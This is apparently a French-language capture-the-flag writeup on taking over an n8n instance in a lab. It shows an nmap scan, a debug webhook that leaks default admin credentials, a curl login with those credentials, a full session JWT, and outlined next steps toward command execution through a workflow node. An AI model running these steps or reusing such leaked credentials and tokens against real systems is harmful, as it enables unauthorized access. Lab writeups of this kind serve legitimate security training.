```markdown
# CTF - n8n Sandbox Escape Writeup

## Target Information
- IP: 10.8.0.2
- Ports: 22 (SSH), 443 (HTTPS/n8n), 5678 (HTTP/n8n)

## Step 1: Initial Reconnaissance
```bash
nmap -sV -Pn -sC 10.8.0.2
```
Résultats:
- n8n version 2.11.3 sur port 5678 et 443
- Certificat SSL avec hostname: n8n.company.local

## Step 2: Information Disclosure via Webhook
Le endpoint `/webhook/health` expose des informations sensibles:

```bash
curl -s http://10.8.0.2:5678/webhook/health
```

Réponse contient:
```json
{
  "_debug": {
    "admin_email": "admin@cyberlab.local",
    "init_password": "CyberL4b_N8N_2026!",
    "note": "CHANGE DEFAULT CREDS - ticket OPS-4821"
  }
}
```

## Step 3: Authentication Bypass
Utilisation des credentials exposés pour obtenir un token:

```bash
curl -s http://10.8.0.2:5678/rest/login \
  -H "Host: n8n.company.local" \
  -H "Content-Type: application/json" \
  -X POST \
  -d '{"emailOrLdapLoginId":"admin@cyberlab.local","password":"CyberL4b_N8N_2026!"}'
```

## Step 4: Session Hijacking
Le cookie JWT reçu:
```
n8n-auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5YWFjNjY2LTI5YTUtNDQ3NC1iMTcxLTExOGEzYzFmNDEyMyIsImhhc2giOiJCdDR2aXNHb1ZYIiwidXNlZE1mYSI6ZmFsc2UsImlhdCI6MTc3MzM2MTk5NSwiZXhwIjoxNzczOTY2Nzk1fQ.qQhucU_mJBAw5GwUhNkgtEar3T8VJcu8ZdJ4wdA_c8k
```

Pour l'utiliser dans le navigateur:
1. Ouvrir DevTools (F12)
2. Aller dans Application → Storage → Cookies → http://10.8.0.2
3. Ajouter/modifier le cookie:
   - Name: `n8n-auth`
   - Value: [le token ci-dessus]
   - Domain: `10.8.0.2`
   - Path: `/`
4. Rafraîchir la page

## Vulnérabilité Exploitée
**Information Disclosure**: Le webhook `/webhook/health` expose des données de debug contenant des credentials par défaut.

## Impact
- Accès administrateur à l'interface n8n
- Possibilité d'exécuter des workflows arbitraires
- Potentiel d'escalade vers RCE via les fonctionnalités de n8n

## Next Steps
Une fois connecté en tant qu'admin:
1. Créer un workflow avec le nœud "Execute Command"
2. Exécuter des commandes système pour sortir du sandbox
3. Accéder au host sous-jacent
```
